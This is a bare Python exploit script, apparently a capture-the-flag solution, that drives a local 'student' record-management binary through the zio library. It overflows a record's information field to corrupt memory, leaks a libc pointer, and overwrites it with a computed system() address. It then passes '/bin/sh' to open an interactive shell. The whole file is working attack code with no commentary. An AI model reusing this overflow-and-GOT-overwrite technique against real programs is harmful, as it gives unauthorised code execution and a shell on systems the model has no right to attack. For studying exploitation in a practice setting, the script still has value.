#! /usr/bin/python

from zio import *

io = zio("./student",timeout=999999)

raw_input('wait debuger')
#add 1
io.read_until("choose")

io.writeline('a')

io.read_until("num")

io.writeline("11111111")

io.read_until("student")

io.writeline('/bin/sh')

io.read_until('student:')

io.writeline('x')

io.read_until('student')

io.writeline('11')

io.read_until('1:')

io.writeline('11')

io.read_until('2:')

io.writeline('11')

io.read_until('3:')

io.writeline('11')

io.read_until('4:')

io.writeline('11')

io.read_until('5:')

io.writeline('11')

io.read_until('information')

io.writeline('a')
#add 2
io.read_until("choose")

io.writeline('a')

io.read_until("num")

io.writeline("11111110")

io.read_until("student")

io.writeline('aaa')

io.read_until('student:')

io.writeline('x')

io.read_until('student')

io.writeline('11')

io.read_until('1:')

io.writeline('11')

io.read_until('2:')

io.writeline('11')

io.read_until('3:')

io.writeline('11')

io.read_until('4:')

io.writeline('11')

io.read_until('5:')

io.writeline('11')

io.read_until('information')

io.writeline('a')

#add 3
io.read_until("choose")

io.writeline('a')

io.read_until("num")

io.writeline("22222222")

io.read_until("student")

io.writeline('aaa')

io.read_until('student:')

io.writeline('x')

io.read_until('student')

io.writeline('11')

io.read_until('1:')

io.writeline('11')

io.read_until('2:')

io.writeline('11')

io.read_until('3:')

io.writeline('11')

io.read_until('4:')

io.writeline('11')

io.read_until('5:')

io.writeline('11')

io.read_until('information')

io.writeline('a')


#change 

io.read_until('choose')

io.writeline('m')

io.read_until('modify')

io.writeline('11111110')

io.read_until("student")

io.writeline('aaa')

io.read_until('student:')

io.writeline('x')

io.read_until('student')

io.writeline('11')

io.read_until('1:')

io.writeline('11')

io.read_until('2:')

io.writeline('11')

io.read_until('3:')

io.writeline('11')

io.read_until('4:')

io.writeline('11')

io.read_until('5:')

io.writeline('11')

io.read_until('information')

io.writeline('a'*176 + l32(0x01010101)+l32(0x01010101) +'a'*48+l64(0x604040))
#leak
io.read_until('choose')

io.writeline('q')

io.read_until("[Y?N]")

io.writeline('n')

io.read_until('num')
io.writeline('16843009')
io.read_until('info    ')
a = io.read(8)
a = hex(l64(a))
a = a[3:]
print '0x' + a

#write

io.read_until('choose')

io.writeline('m')

io.read_until('modify')

io.writeline('16843009')

io.read_until("student")

io.writeline('aaa')

io.read_until('student:')

io.writeline('x')

io.read_until('student')

io.writeline('11')

io.read_until('1:')

io.writeline('11')

io.read_until('2:')

io.writeline('11')

io.read_until('3:')

io.writeline('11')

io.read_until('4:')

io.writeline('11')

io.read_until('5:')

io.writeline('11')

io.read_until('information')

io.writeline(l64(int(a,16) - 0x88ac0+ 0x46640))



io.read_until('choose')

io.writeline('m')

io.read_until('modify')

io.writeline('16843009')

io.read_until("student")

io.writeline('/bin/sh')

io.interact()
